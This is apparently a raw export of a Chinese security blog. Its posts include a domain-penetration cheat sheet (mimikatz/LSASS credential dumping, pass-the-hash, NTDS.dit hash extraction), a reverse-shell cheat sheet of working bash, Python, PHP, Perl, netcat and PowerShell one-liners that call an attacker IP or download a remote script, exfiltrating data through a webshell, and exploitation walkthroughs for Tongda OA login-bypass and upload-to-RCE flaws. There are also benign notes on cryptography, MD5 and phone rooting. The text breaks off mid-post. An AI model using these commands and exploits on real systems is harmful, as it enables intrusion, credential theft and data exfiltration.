<h4 id="1、刷入新的ROM系统"><a href="#1、刷入新的ROM系统" class="headerlink" title="1、刷入新的ROM系统"></a><strong>1、刷入新的ROM系统</strong></h4><p>国行的一加手机默认使用的是氢OS，而氧OS则自带google全家桶，在应用权限上也有区别，更多两者的区别信息自行查询。<br>1）下载氧OS ROM包；拷入手机根目录</p>
<p><img src="/images/upload/image-20200320005727319.png">2）手机数据双清操作；关机，然后后按住音量减键和锁屏键进入recovery  mode<br><img width=30% height=10% src="/images/upload/IMG_0560.JPG" >选择清除数据和缓存<br><img width=30% height=10% src="/images/upload/IMG_0561.JPG">然后点击完成！<br>3）刷入氧OS ROM包<br><img width=30% height=10% src="/images/upload/IMG_0560.JPG">点击安装本地升级文件，选中刚刚拷入的ROM包，等待安装完成，如下图<br><img width=30% height=10% src="/images/upload/IMG_0555.JPG"><strong>不要连接网络，会连接google检查更新，先跳过！！</strong></p>
<h4 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a><strong>2、获取ROOT权限</strong></h4><p>1）开启手机开发者模式，打开usb调试选项；打开oem解锁；将手机设置为滑动解锁，通过usb数据线连接电脑<br>2）Windows下载安装mininal adb and fastboot软件<br><img width=30% height=10% src="/images/upload/img_000.png"><img width=50% height=10% src="/images/upload/img_001.png">3）下载第三方Recovery mode；将其放入mininal adb安装目录下，以方便操作<br><img width=30% height=10% src="/images/upload/img_002.png">4）下载Magisk Manager压缩包，拷入手机根目录（使用脸谱获得root权限）<br><img width=30% height=10% src="/images/upload/img_003.png">5）命令行进入adb安装目录；执行如下命令进入recovery mode<br><img width=50% height=10% src="/images/upload/img_004.png">然后点击高级—进入刷机模式<br><img width=50% height=10% src="/images/upload/img_005.png"><img width=50% height=10% src="/images/upload/img_006.jpg">6）然后解锁OEM<br><img width=50% height=10% src="/images/upload/img_007.png">片刻后出现界面，选择unlock the bootloader<img width=50% height=10% src="/images/upload/img_008.jpg"></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>Penetration</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透知识备忘</title>
    <url>/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html</url>
    <content><![CDATA[<p>域渗透的一般流程：</p>
<p>入口主机–&gt;权限维持–&gt;横向渗透–&gt;取密码(域用户)–&gt;域信息收集–&gt;横向渗透–&gt;接管域控 </p>
<h3 id="一、域信息收集"><a href="#一、域信息收集" class="headerlink" title="一、域信息收集"></a>一、域信息收集</h3><p><strong>1、net</strong></p>
<p><code>net user /domain</code>  获取域用户列表<br><code>net group. &quot;domain admins&quot; /doamin</code>  获取域管理员列表<br><code>net group &quot;domain controllers&quot; /domain </code>  查看域控制器(如果有多台)<br><code>net group &quot;domail computers&quot; /domain</code>  查看域机器<br><code>net group /domain</code>  查询域里面的组<span id="more"></span></p>
<p><code>net view</code>  查看同一域内机器列表<br><code>net view \\ip</code>  查看某IP共享<br><code>net view \\GHQ</code>  查看GHQ计算机的共享资源列表<br><code>net view /domain</code>  查看内网存在多少个域<br><code>net view /domain:XYZ</code>  查看XYZ域中的机器列表</p>
<p><strong>2、nltest信任域</strong></p>
<p>查询域间的信任关系<br><code>nettles  /domain_trusts /all_trusts /v /server:192.168.52.2</code><br>返回所有信任192.168.52.2的域</p>
<p><code>nltest /dsgedc:XXXXX /serve:192.168.52.2</code><br>返回域控和其相应的IP地址，XXXXX是上步骤结果中的一个域</p>
<p>nltest的命令：<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZHJlYW1lci1maXNoL3AvMzQ3Mzg5NS5odG1s">https://www.cnblogs.com/dreamer-fish/p/3473895.html<i class="fa fa-external-link-alt"></i></span></p>
<p><strong>3、nbtscan.exe</strong></p>
<p>扫描网段内是否存在域内机器</p>
<p><code>nbtscan.exe 192.168.52.0/24</code></p>
<p><strong>4、csvde</strong></p>
<p>csvde是windows server 2008的内置命令行工具，如果安装了AD DS或Active Directory轻型目录服务，则功能可用<br><code>csvde -setspn hack -f c:\windows\temp\hack.csv</code><br>LDAP的存储规则：<br>区分名(DN)：一个条目的区分名叫做‘dn’，在一个目录中这个名称总是唯一的<br>CN&#x3D;Common Name为用户名或服务器名，最长可以到80个字符，可以为中文<br>OU&#x3D;Organization Unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文<br>O&#x3D;Organization 为组织名，可以3-64个字符长<br>C&#x3D;Country为国家名，可选，为2个字符长</p>
<p><strong>5、setspn</strong></p>
<p><code>setspn -T 域名 -Q */*</code></p>
<ul>
<li>SPN官方名称即“服务主体名称”，本质上存的是域内各种服务资源的对应关系</li>
<li>如，对应的服务类型是什么，机器名是什么，服务端口是多少</li>
<li>借助SPN可以快速定位当前目标域中所有存活的各类服务器</li>
</ul>
<p>例如查找mssql服务器<br><code>setspn -T 域名 -Q */* | findstr MSSQL</code></p>
<p><strong>6、dnsdump.exe</strong></p>
<p>获取域名其对应的IP地址<br><code>dnsdump.exe -u 域名/域用户 -p 域密码 域控机器名 -r</code></p>
<h3 id="二、域渗透思路"><a href="#二、域渗透思路" class="headerlink" title="二、域渗透思路"></a>二、域渗透思路</h3><h4 id="2-1、注册表读取密码-本地"><a href="#2-1、注册表读取密码-本地" class="headerlink" title="2.1、注册表读取密码-本地"></a>2.1、注册表读取密码-本地</h4><p>​    <strong>1、获取注册表信息</strong>：<br><code>reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</code><br><code>reg save HKLM\SAM c:\windows\temp\Sam.hiv</code></p>
<p>​    <strong>2、mimikatz解密</strong><br><code>lsadump::sam /sam:Sam.hiv /system:Sys.hiv</code></p>
<h4 id="2-2、lsass进程读取内存hash"><a href="#2-2、lsass进程读取内存hash" class="headerlink" title="2.2、lsass进程读取内存hash"></a>2.2、lsass进程读取内存hash</h4><p>windows 03和08中明文存储账号密码；12和16中加密为hash值</p>
<p>​    <strong>1、目标机执行procdump.exe</strong><br><code>procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</code></p>
<p>​    <strong>2、mimikatz中运行,结果保存在日志里</strong><br><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p>
<h4 id="2-3、LaZagne取各种连接工具密码，浏览器保存密码等"><a href="#2-3、LaZagne取各种连接工具密码，浏览器保存密码等" class="headerlink" title="2.3、LaZagne取各种连接工具密码，浏览器保存密码等"></a>2.3、LaZagne取各种连接工具密码，浏览器保存密码等</h4><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmU=">https://github.com/AlessandroZ/LaZagne<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="2-4、凭证窃取"><a href="#2-4、凭证窃取" class="headerlink" title="2.4、凭证窃取"></a>2.4、凭证窃取</h4><p>通过tasklist &#x2F;v查看进程用户，如果有域用户开启的进程，则窃取凭证</p>
<p><code>incognito.exe list_tokens -u</code>  查看目标机当前存储那些凭证<br><code>incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</code>  使用域用户administrator凭证开启一个cmd</p>
<h4 id="2-5、命令行渗透-IPC连接"><a href="#2-5、命令行渗透-IPC连接" class="headerlink" title="2.5、命令行渗透-IPC连接"></a>2.5、命令行渗透-IPC连接</h4><p>为什么命令后渗透？？<br>1、远程登录桌面增加暴漏风险<br>2、目标管理员可能对服务器禁用远程登录</p>
<ul>
<li>建立ipc连接<br>可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令上传和下载文件直接通过copy命令就可以，<br>不过路径换成UNC路径。以\开头的路径就是UNC路径，比如\192.168.1.1\c$\users</li>
</ul>
<p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code><br>例如：<code>net use \\192.168.1.1 /u:hack\administrator  1q2w3</code></p>
<ul>
<li>第二步：上传&#x2F;下载文件<br>例如：从本地上传1.bat到192.168.1.1机器C盘根目录下<br><code>copy 1.bat \\192.168.1.1\C$\</code></li>
</ul>
<p> dir、copy、xcopy、move、type的参数都可以使用UNC路径</p>
<h4 id="2-6、命令行渗透-计划任务执行命令"><a href="#2-6、命令行渗透-计划任务执行命令" class="headerlink" title="2.6、命令行渗透-计划任务执行命令"></a>2.6、命令行渗透-计划任务执行命令</h4><ul>
<li><p>创建计划任务<br><code>schtasks /create /tn 任务名 /U 域\域用户 /P 域用户密码 /tr 执行的命令或者bat路径 /sc ONSTART /s 域机器IP /RU system</code></p>
</li>
<li><p>执行计划任务</p>
<p><code>schtasks /run /tn 任务名 /s 域机器IP /U 域\域用户 -P 域用户密码</code></p>
</li>
<li><p>删除计划任务</p>
<p><code>schtasks /F /delete /tn 任务名 /s 域机器IP /U 域\域用户 /P 域用户密码</code></p>
</li>
</ul>
<p>例如：在192.168.1.1上建立task1任务（以system权限执行cmd程序）<br><code>schtasks /create /tn task1 /U hack\administrator /P 1q2w3e -tr &quot;c:\windows\system32\cms.exe /c whoami &gt; c:\\windows\\temp\\1.txt&quot; /sc ONSTART /s 192.168.1.1 /RU system</code></p>
<h4 id="2-7、命令行渗透-psexec-exe"><a href="#2-7、命令行渗透-psexec-exe" class="headerlink" title="2.7、命令行渗透-psexec.exe"></a>2.7、命令行渗透-psexec.exe</h4><p><strong>知道域账号密码</strong></p>
<ul>
<li><p>建立IPC连接</p>
<p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code></p>
</li>
<li><p>执行命令</p>
<p><code>psexec.exe \\192.168.1.1 -s cmd.exe -accepteula</code><br>-accepteula第一次运行回弹框，输入这个参数便不会弹框；-s 以“nt authority\system”权限运行远程进程</p>
</li>
</ul>
<p><strong>不知明文域账号密码，hash传递</strong></p>
<p><code>psexec_hash.exe -hashes :用户hash 域名\用户名@目标IP</code></p>
<h4 id="2-8、获取内网代理"><a href="#2-8、获取内网代理" class="headerlink" title="2.8、获取内网代理"></a>2.8、获取内网代理</h4><p>内网中有些资源可能需要挂指定<code>代理</code>才能进行访问，一般是<code>IE</code>代理或<code>PAC</code>代理，这两个代理可以通过注册表来读取。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v AutoConfigURL</span><br></pre></td></tr></table></figure>

<h3 id="三、Windows-api-利用"><a href="#三、Windows-api-利用" class="headerlink" title="三、Windows api 利用"></a>三、Windows api 利用</h3><p>以下所有利用工具的前提都是已经<code>建立IPC连接</code></p>
<table>
<thead>
<tr>
<th align="left">工具名称</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NetGroupGetUsers.exe</td>
<td align="left">查询域里的各个组里的成员，IP必须是域控IP，域用户随意</td>
</tr>
<tr>
<td align="left">NetLocalGroupGetMembers.exe</td>
<td align="left">查询目标服务器本地管理组的成员</td>
</tr>
<tr>
<td align="left">NetUserEnum.exe</td>
<td align="left">查询目标服务器所有用户，包括隐藏用户</td>
</tr>
</tbody></table>
<p>命令用法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NetGroupGetUsers.exe &quot;domain users&quot; \\192.168.52.2</span><br><span class="line">NetLocalGroupGetMembers.exe \\192.168.52.2</span><br><span class="line">NetUserEnum.exe \\192.168.52.2</span><br></pre></td></tr></table></figure>

<h3 id="四、导域HASH"><a href="#四、导域HASH" class="headerlink" title="四、导域HASH"></a>四、导域HASH</h3><p>拿下域控之后，我们可以通过导出域hash将所有域用户的密码取出。</p>
<p><code>Windows</code>的密码是经过<code>hash</code>后存储的，本地存放在<code>hklm\sam</code>以及<code>hklm\system</code>注册表中，域里面是存放在域控制器的<code>c:\windows\ntds\ntds.dit</code>中。<br><code>ntds.dit</code>其实就是个<code>esent</code>数据库，微软本身就有一系列文档化的<code>api</code>能够操作这个数据库：<span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvZ2cyOTQwNzQuYXNweA==">官方文档<i class="fa fa-external-link-alt"></i></span>，首先我们要创建一个快照：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; creat quit quit</span><br></pre></td></tr></table></figure>

<p>接下来我们挂载快照：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;快照id&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>

<p>接下来我们复制<code>ntds.dit</code>到本地：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">copy 装载位置\windows\NTDS\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure>

<p>接下来我们解除挂载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;快照id&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>

<p>最后删除快照：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;delete &#123;快照id&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>

<p>接下来我们就可以开始解密了，首先通过注册表的方式获取<code>KEY</code>，再用<code>NTDSDumpEx</code>获取所有域用户hash：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\sys.hiv</span><br><span class="line">NTDSDdumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Penetration</tag>
      </tags>
  </entry>
  <entry>
    <title>Cryptography笔记</title>
    <url>/2018/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<ol>
<li><p>加密方法可以分为两大类。一类是单钥加密（private key cryptography），还有一类叫做双钥加密（public key cryptography）。前者的加密和解密过程都用同一套密码，后者的加密和解密过程用的是两套密码。历史上，人类传统的加密方法都是前一种，比如二战期间德军用的Enigma电报密码。<span id="more"></span>莫尔斯电码也可以看作是一种私钥加密方法。</p>
</li>
<li><p>在单钥加密的情况下，密钥只有一把，所以密钥的保存变得很重要。一旦密钥泄漏，密码也就被破解。</p>
</li>
<li><p>在双钥加密的情况下，密钥有两把，一把是公开的公钥，还有一把是不公开的私钥。</p>
</li>
</ol>
<p>双钥加密的原理如下：<br>a) 公钥和私钥是一一对应的关系，有一把公钥就必然有一把与之对应的、独一无二的私钥，反之亦成立。</p>
<p>b) 所有的（公钥, 私钥）对都是不同的。</p>
<p>c) 用公钥可以解开私钥加密的信息，反之亦成立。</p>
<p>d) 同时生成公钥和私钥应该相对比较容易，但是从公钥推算出私钥，应该是很困难或者是不可能的。</p>
<ol start="4">
<li>目前，通用的单钥加密算法为DES（Data Encryption Standard），通用的双钥加密算法为RSA（ Rivest-Shamir-Adleman），都产生于上个世纪70年代。</li>
<li>在双钥体系中，公钥用来加密信息，私钥用来数字签名。</li>
<li>因为任何人都可以生成自己的（公钥，私钥）对，所以为了防止有人散布伪造的公钥骗取信任，就需要一个可靠的第三方机构来生成经过认证的（公钥，私钥）对。目前，世界上最主要的数字服务认证商是位于美国加州的Verisign公司，它的主要业务就是分发RSA数字证书。</li>
</ol>
]]></content>
      <categories>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>Cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>常见反向shell方法</title>
    <url>/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html</url>
    <content><![CDATA[<h2 id="常见反向shell生成与使用方法："><a href="#常见反向shell生成与使用方法：" class="headerlink" title="常见反向shell生成与使用方法："></a>常见反向shell生成与使用方法：</h2><p>​    如果目标存在命令&#x2F;代码执行漏洞，可用此些方法获取shell。</p>
<h3 id="Bash："><a href="#Bash：" class="headerlink" title="Bash："></a>Bash：</h3><p>​    Attacker：nc  -lvvp  4444</p>
<p>​    Victimer：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/Attacker_IP/4444  0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h3><p>​    Attacker：nc  -lvvp  4444</p>
<p>​    Victimer：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.1.130&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Netcat-nc-："><a href="#Netcat-nc-：" class="headerlink" title="Netcat(nc)："></a>Netcat(nc)：</h3><p>​    如果目标机器存在nc且有-e参数，那么可以使用nc建立反向shell</p>
<p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e  /bin/bash  Attacker_IP 4444</span><br></pre></td></tr></table></figure>



<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;172.16.1.130&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Java："><a href="#Java：" class="headerlink" title="Java："></a>Java：</h3><p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h3 id="Perl："><a href="#Perl：" class="headerlink" title="Perl："></a>Perl：</h3><p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.16.1.130&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">172.16</span>.<span class="number">1.130</span> <span class="literal">-port</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<h3 id="Xterm："><a href="#Xterm：" class="headerlink" title="Xterm："></a>Xterm：</h3><p>​    Victimer:  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xterm -display Attacker_IP:1</span><br></pre></td></tr></table></figure>

<p>​    Attacker:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Xnest :1</span><br><span class="line">xhost +Victimer_IP</span><br></pre></td></tr></table></figure>



<h3 id="Msfvenom连接一句话："><a href="#Msfvenom连接一句话：" class="headerlink" title="Msfvenom连接一句话："></a>Msfvenom连接一句话：</h3><p>msf支持多种反弹方式，比如exe ps php asp aspx甚至是ruby等，我们可以用msfvenom来生成payload，然后在msf中监听，执行之后就会反弹回来session。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 172.16.1.130</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
  </entry>
  <entry>
    <title>文件名会影响文件的MD5哈希值吗?</title>
    <url>/2021/%E6%96%87%E4%BB%B6%E5%90%8D%E4%BC%9A%E5%BD%B1%E5%93%8D%E6%96%87%E4%BB%B6%E7%9A%84MD5%E5%93%88%E5%B8%8C%E5%80%BC%E5%90%97.html</url>
    <content><![CDATA[<blockquote>
<p>在使用EXT文件系统的Linux中，由于文件名未存储在文件中，因此不会存储在文件所在的目录项(dentry)中，然后文件的inode映射到名称。在Linux中更改文件名不会对其md5sum产生影响。</p>
<p>1.md5是基于FILE的二进制内容计算的。<br>2.文件名，最后修改的东西等都是元数据。md5并不真正依赖元数据。</p>
</blockquote>
<h4 id="一、答案："><a href="#一、答案：" class="headerlink" title="一、答案："></a>一、答案：</h4><p>不会！！，哈希仅是文件内容的哈希。您可以在<font color=red>md5sum</font>及其MD5实现的源代码中看到此内容。如果您可以访问md5sum，也可以进行测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;just so so&quot;</span> &gt; file1.txt</span><br><span class="line">$ <span class="built_in">cp</span> file1.txt file2.txt</span><br><span class="line">$ md5 file1.txt </span><br><span class="line">MD5 (file1.txt) = 658c6c1a9584852aba5913aef712787e</span><br><span class="line">$ md5 file2.txt</span><br><span class="line">MD5 (file2.txt) = 658c6c1a9584852aba5913aef712787e</span><br></pre></td></tr></table></figure>

<span id="more"></span><img src="https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210710160630.png" alt="image-20210710160628801"  />

<h4 id="二、其它情况："><a href="#二、其它情况：" class="headerlink" title="二、其它情况："></a>二、其它情况：</h4><p>仅当文件名称包含在哈希计算中时。例如，使用伪代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hash1 = md5(contents of file);</span><br><span class="line">$ hash2 = md5(name of file + contents of file);</span><br></pre></td></tr></table></figure>

<p>将产生两个单独的哈希。</p>
]]></content>
  </entry>
  <entry>
    <title>源码或文件打包</title>
    <url>/2020/%E6%BA%90%E7%A0%81%E6%88%96%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85.html</url>
    <content><![CDATA[<p>​        在我们拿下webshell的时候，想要获取数据或者源码往往会用菜刀或者蚁剑去打包，但是这个时候往往就会出现很多问题，列如打包失败，或者是打包得不完整等等。</p>
<p>这个时候如果对方是windows服务器的话，我们可以将winrar安装包中的winrar.exe或者本地装的<code>winrar.exe</code>上传过去</p>
<img src="../images/upload/winrar.jpg" style="zoom:50%;" />

<span id="more"></span>

<p>压缩盘下的data文件夹，并且命名为bak.rar  <code>winrar.exe a -ag -k -r -s -ibck c:/bak.rar c:/data/</code></p>
<p>压缩多个文件 <code>winrar a -ag -ibck bak.rar filename1 filename2 filename....</code></p>
<p>参数说明： <code>a</code> :备份所有文件； <code>-ag</code> :当创建压缩文件时，以格式“YYYYMMDDHHMMSS”附加当前日期字符串,文件名bakYYYYMMDDHHMMSS.rar； <code>-k</code> :锁定压缩文件； <code>-r</code>:备份目录和子目录； <code>-s</code> :创建固实压缩文件； <code>-ibck</code>:后台运行；</p>
<p><code>filename1</code>：要压缩的文件名，可以多个，也可用通配符&#96;file*</p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
  </entry>
  <entry>
    <title>通达OA 任意用户登录漏洞复现</title>
    <url>/2020/%E9%80%9A%E8%BE%BEOA1.html</url>
    <content><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>通达OA前台任意用户登录漏洞，影响版本包括通达OA2017、V11.X&lt;V11.5；攻击者利用此漏洞可以接管服务器权限<br><img src="../images/upload/tongd.jpg" alt="OA" style="zoom: 80%;" /></p>
<span id="more"></span>

<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>1.获取code_uid<br>post   &#x2F;general&#x2F;login_code.ph 获取code_uid</p>
<p><img src="/../images/upload/code_uid.png" alt="example"></p>
<p><a href="../file/code_uid.txt">request.txt</a></p>
<p>2.获取sessionID<br>post  &#x2F;logincheck_code.php</p>
<p><img src="/../images/upload/sessid.jpg" alt="example"></p>
<p><a href="../file/sessionID.txt">requests.txt</a></p>
<p>3.实现登录<br>访问<span class="exturl" data-url="aHR0cDovL3h4eHguY29tL2dlbmVyYWwvaW5kZXgucGhw">http://xxxx.com/general/index.php<i class="fa fa-external-link-alt"></i></span> 利用上一步得到的cookies，<br>通过小饼干🍪等工具替换cookie，刷新页面即可成功进入</p>
<p><img src="/../images/upload/admin1.png" alt="example"></p>
<h3 id="0x03-漏洞POC"><a href="#0x03-漏洞POC" class="headerlink" title="0x03 漏洞POC"></a>0x03 漏洞POC</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05TLVNwNGNlL1RvbmdEYU9BLUZhS2UtVXNlcg==">https://github.com/NS-Sp4ce/TongDaOA-FaKe-User<i class="fa fa-external-link-alt"></i></span></p>
<p>利用POC测试站点，若存在漏洞，返回cookie；利用cookie便可直接登录</p>
<p><img src="/../images/upload/poc1.png" alt="poc_result"></p>
<h3 id="0x04-关键词"><a href="#0x04-关键词" class="headerlink" title="0x04 关键词"></a>0x04 关键词</h3><p><span class="exturl" data-url="aHR0cHM6Ly96b29tZXllLm9yZy8=">https://zoomeye.org<i class="fa fa-external-link-alt"></i></span> 中搜索<code>app:&quot;Tongda office anywhere httpd&quot;</code></p>
]]></content>
      <categories>
        <category>通达OA</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA 任意文件上传/文件包含GetShell</title>
    <url>/2020/%E9%80%9A%E8%BE%BEOA2.html</url>
    <content><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>攻击者可以绕过身份认证，上传任意文件，结合文件包含漏洞即可实现RCE。<br>影响版本包含：<br>文件上传：<br><code>V11版 &lt;= 11.3    20200103  2017版 &lt;= 10.19  20190522  2016版 &lt;= 9.13   20170710  2015版 &lt;= 8.15   20160722  2013增强版 &lt;=7.25 20141211  2013版 &lt;= 6.20   20141017</code><span id="more"></span></p>
<p>文件包含：</p>
<p><code>V11版 &lt;= 11.3</code></p>
<h3 id="0x02-解密工具"><a href="#0x02-解密工具" class="headerlink" title="0x02 解密工具"></a>0x02 解密工具</h3><p>代码通过Zend加密处理，需对进行解密操作后获得可读性源码</p>
<ul>
<li>离线解密：<code>链接: https://pan.baidu.com/s/1MHtt3KXVIZAALzZmzTUJeg 密码: tadp</code></li>
<li>在线解密：<code>http://dezend.qiling.org/free.html</code></li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vT0EtdG9uZ2RhLVJDRS90cmVlL21hc3Rlci90b25nZGEvZGVjb2Rl">解密后的部分代码<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 漏洞成因</h3><ul>
<li>漏洞主要两个原因，文件上传、文件包含</li>
</ul>
<p><strong>文件上传</strong></p>
<p>ispirit&#x2F;im&#x2F;upload.php<br>要上传先要绕过登录认证，但在upload.php修复前，如果变量<code>$P</code>非空则不经过auth.php验证即可执行后续代码</p>
<p><img src="/../images/upload/comper.png" alt="代码对比"></p>
<p>上传后的文件不在根目录，所以无法直接利用，需结合文件包含</p>
<p><strong>文件包含</strong></p>
<p>ispirit&#x2F;interface&#x2F;gateway.php<br>这里问题在于可以构造json，使其执行<code>include_once</code>代码</p>
<p><img src="/../images/upload/sour.png" alt="include"></p>
<h3 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h3><p>1.上传文件请求</p>
<p><img src="/../images/upload/upim.jpg" alt="upload"></p>
<p><a href="../file/upload.txt">命令执行request.txt</a>    <a href="../file/getshell.txt">GetWebshell request.txt</a></p>
<p>2.包含文件执行命令</p>
<p><img src="/../images/upload/exec.jpg" alt="exec"></p>
<p><a href="../file/exec.txt">执行命令 request.txt</a></p>
<h3 id="0x05-异常处理"><a href="#0x05-异常处理" class="headerlink" title="0x05 异常处理"></a>0x05 异常处理</h3><ul>
<li><strong>版本路径</strong>：</li>
</ul>
<p>有些版本gateway.php路径不同</p>
<p>例如2013：</p>
